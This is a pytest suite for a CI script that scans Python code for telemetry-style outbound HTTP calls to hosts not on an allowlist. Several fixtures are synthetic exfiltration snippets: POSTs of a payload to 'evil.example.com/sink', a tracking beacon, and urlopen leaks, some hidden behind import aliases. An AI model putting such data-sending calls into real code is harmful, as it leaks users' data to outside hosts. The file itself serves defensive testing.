"""Tests for ``scripts/check_privacy_no_telemetry.py``.

Per the v0.2.2 implementation directive §11.2 gate-ownership ruling,
this gate ships in the early CI-infra PR (before P4.1's OSV.dev client
lands). The tests exercise the AST scanner against synthetic
attack-surface code samples: legitimate HTTP to allowlisted hostnames
must pass; telemetry-shaped HTTP must fail.

The tests run the script as a subprocess against a tmp-path
attack_surface/ directory so they exercise the actual entry-point code
path, not an importable helper. This pins behaviour from the CI
perspective: if CI invokes the script, the tests cover what CI sees.
"""

from __future__ import annotations

import re
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "scripts" / "check_privacy_no_telemetry.py"


def _assert_gate_flagged_hostname(result: subprocess.CompletedProcess[str], expected: str) -> None:
    """Assert the gate's stderr names ``expected`` in the structured hostname position.

    Extracts the hostname from the gate's canonical error format
    (``... targets hostname 'X' which is not in ALLOWED_HOSTNAMES ...``)
    via regex and compares the captured group to ``expected``. Stricter
    than a bare substring check (catches gate-message-format drift) and
    avoids the CodeQL ``py/incomplete-url-substring-sanitization``
    false positive that fires on ``HOSTNAME in stderr`` patterns.
    """
    match = re.search(r"hostname '([^']+)'", result.stderr)
    assert match is not None, f"gate stderr did not contain a flagged hostname: {result.stderr!r}"
    assert match.group(1) == expected, (
        f"gate flagged {match.group(1)!r}, expected {expected!r}; full stderr={result.stderr!r}"
    )


def _run_script_with_synthetic_surface(
    tmp_path: Path, surface_files: dict[str, str]
) -> subprocess.CompletedProcess[str]:
    """Run the privacy script against a synthetic attack_surface/ tree.

    Constructs a tmp repo skeleton with the script symlinked in, then
    invokes the script. Returns the completed process so tests can
    assert on exit code and stderr.
    """
    # Build a tmp repo skeleton:
    #   tmp_path/
    #     scripts/check_privacy_no_telemetry.py  (copy)
    #     src/claude_monitoring/attack_surface/  (synthetic)
    tmp_scripts = tmp_path / "scripts"
    tmp_scripts.mkdir()
    (tmp_scripts / "check_privacy_no_telemetry.py").write_text(SCRIPT.read_text())

    surface_dir = tmp_path / "src" / "claude_monitoring" / "attack_surface"
    surface_dir.mkdir(parents=True)
    for rel_path, content in surface_files.items():
        target = surface_dir / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)

    return subprocess.run(
        [sys.executable, str(tmp_scripts / "check_privacy_no_telemetry.py")],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        check=False,
    )


class TestPrivacyGateAllowedHostnames:
    def test_passes_with_osv_dev_get(self, tmp_path: Path) -> None:
        """Phase 4 OSV.dev CVE lookup is the canonical allowed POST/GET site."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "cve_client.py": (
                    "import requests\n"
                    "def query(pkg):\n"
                    "    return requests.get('https://api.osv.dev/v1/query', timeout=10)\n"
                ),
            },
        )
        assert result.returncode == 0, f"stderr={result.stderr!r}"
        assert "PASS" in result.stdout

    def test_passes_with_loopback_dashboard(self, tmp_path: Path) -> None:
        """The dashboard's internal API on 127.0.0.1 is permitted."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "dashboard_hook.py": (
                    "import requests\ndef notify():\n    requests.post('http://127.0.0.1:9999/refresh', timeout=2)\n"
                ),
            },
        )
        assert result.returncode == 0, f"stderr={result.stderr!r}"

    def test_passes_with_no_http_at_all(self, tmp_path: Path) -> None:
        """Pure CPU code with no HTTP imports is trivially clean."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "pure.py": ("from __future__ import annotations\ndef add(a: int, b: int) -> int:\n    return a + b\n"),
            },
        )
        assert result.returncode == 0


class TestPrivacyGateBlockedHostnames:
    def test_fails_on_attacker_controlled_post(self, tmp_path: Path) -> None:
        """A POST to a non-allowlisted hostname is the canonical violation."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "exfil.py": (
                    "import requests\n"
                    "def leak(payload):\n"
                    "    requests.post('https://evil.example.com/sink', json=payload)\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "evil.example.com")
        assert "ALLOWED_HOSTNAMES" in result.stderr

    def test_fails_on_get_to_disallowed_host(self, tmp_path: Path) -> None:
        """GETs are also policed — telemetry can leak in URL params or cookies."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "tracker.py": (
                    "import requests\ndef beacon():\n    requests.get('https://analytics.evil.com/track?id=42')\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "analytics.evil.com")

    def test_fails_on_urllib_urlopen_to_disallowed_host(self, tmp_path: Path) -> None:
        """urllib.request.urlopen is the stdlib equivalent and must also be policed."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "stdlib_leak.py": (
                    "import urllib.request\n"
                    "def leak():\n"
                    "    urllib.request.urlopen('https://collector.example.com/api')\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "collector.example.com")


class TestPrivacyGateRuntimeURLs:
    def test_fails_on_fstring_url(self, tmp_path: Path) -> None:
        """Runtime-computed URLs (f-strings, variables) can't be statically
        verified — the gate flags them as 'use a wrapped helper'."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "dynamic.py": ("import requests\ndef fetch(host):\n    return requests.get(f'https://{host}/api')\n"),
            },
        )
        assert result.returncode == 1
        assert "runtime-computed" in result.stderr or "wrapped helper" in result.stderr

    def test_fails_on_variable_url(self, tmp_path: Path) -> None:
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "varurl.py": (
                    "import requests\n"
                    "ENDPOINT = 'https://upstream.example.com'\n"
                    "def go():\n"
                    "    return requests.get(ENDPOINT)\n"
                ),
            },
        )
        assert result.returncode == 1


class TestPrivacyGateAliasImports:
    """Closes the CRITICAL alias-import bypass flagged by code review:
    ``from requests import post`` and ``import requests as rq`` must
    NOT silently pass when the call targets a non-allowlisted hostname.
    """

    def test_fails_on_from_requests_import_post_to_evil(self, tmp_path: Path) -> None:
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "alias_from.py": (
                    "from requests import post\n"
                    "def leak(payload):\n"
                    "    post('https://evil.example.com/sink', json=payload)\n"
                ),
            },
        )
        assert result.returncode == 1, f"alias-import bypass not caught: {result.stdout!r}"
        _assert_gate_flagged_hostname(result, "evil.example.com")

    def test_fails_on_from_requests_import_as_alias(self, tmp_path: Path) -> None:
        """``from requests import post as p; p(...)`` must also resolve."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "alias_renamed.py": (
                    "from requests import post as p\ndef leak():\n    p('https://evil.example.com/sink', json={})\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "evil.example.com")

    def test_fails_on_import_requests_as(self, tmp_path: Path) -> None:
        """``import requests as rq; rq.post(...)`` must resolve."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "module_alias.py": (
                    "import requests as rq\ndef leak():\n    rq.post('https://evil.example.com/sink', json={})\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "evil.example.com")

    def test_fails_on_urllib_request_alias(self, tmp_path: Path) -> None:
        """``import urllib.request as ur; ur.urlopen(...)`` must resolve."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "urllib_alias.py": (
                    "import urllib.request as ur\ndef leak():\n    ur.urlopen('https://evil.example.com/sink')\n"
                ),
            },
        )
        assert result.returncode == 1
        _assert_gate_flagged_hostname(result, "evil.example.com")

    def test_passes_on_alias_with_allowlisted_host(self, tmp_path: Path) -> None:
        """Aliasing is fine when the destination is allowlisted —
        the alias map should not produce false positives."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                "alias_safe.py": (
                    "from requests import get\n"
                    "def query():\n"
                    "    return get('https://api.osv.dev/v1/query', timeout=10)\n"
                ),
            },
        )
        assert result.returncode == 0, f"false positive on allowlisted alias: {result.stderr!r}"


class TestPrivacyGateEdgeCases:
    def test_passes_with_empty_attack_surface(self, tmp_path: Path) -> None:
        """No .py files under attack_surface/ → trivial pass."""
        # Create the dir but no files
        (tmp_path / "src" / "claude_monitoring" / "attack_surface").mkdir(parents=True)
        tmp_scripts = tmp_path / "scripts"
        tmp_scripts.mkdir()
        (tmp_scripts / "check_privacy_no_telemetry.py").write_text(SCRIPT.read_text())
        result = subprocess.run(
            [sys.executable, str(tmp_scripts / "check_privacy_no_telemetry.py")],
            cwd=tmp_path,
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 0
        assert "PASS" in result.stdout

    def test_passes_with_no_attack_surface_dir_at_all(self, tmp_path: Path) -> None:
        """If the directory doesn't exist (very old branch), pass silently."""
        tmp_scripts = tmp_path / "scripts"
        tmp_scripts.mkdir()
        (tmp_scripts / "check_privacy_no_telemetry.py").write_text(SCRIPT.read_text())
        result = subprocess.run(
            [sys.executable, str(tmp_scripts / "check_privacy_no_telemetry.py")],
            cwd=tmp_path,
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 0

    def test_real_attack_surface_passes(self) -> None:
        """The actual post-P1.1 attack_surface/ tree must pass.

        Pins the baseline: P1.1 ships zero HTTP in attack_surface/, and
        this assertion would fail if anyone sneaks in an outbound call
        before the gate is wired into CI.
        """
        result = subprocess.run(
            [sys.executable, str(SCRIPT)],
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 0, f"stderr={result.stderr!r}"
        assert "PASS" in result.stdout


@pytest.mark.parametrize(
    "method",
    ["get", "post", "put", "patch", "delete", "head"],
)
class TestPrivacyGateMethodCoverage:
    def test_all_http_verbs_policed(self, tmp_path: Path, method: str) -> None:
        """Every requests verb is policed equally — telemetry can leak via
        any of them. POST is the obvious case; DELETE via URL params is
        the less-obvious one (DELETE bodies are spec-discouraged so the
        payload tends to be in the URL itself)."""
        result = _run_script_with_synthetic_surface(
            tmp_path,
            {
                f"verb_{method}.py": (
                    f"import requests\ndef go():\n    requests.{method}('https://leak.example.net/x')\n"
                ),
            },
        )
        assert result.returncode == 1, f"{method} should be policed"
        _assert_gate_flagged_hostname(result, "leak.example.net")
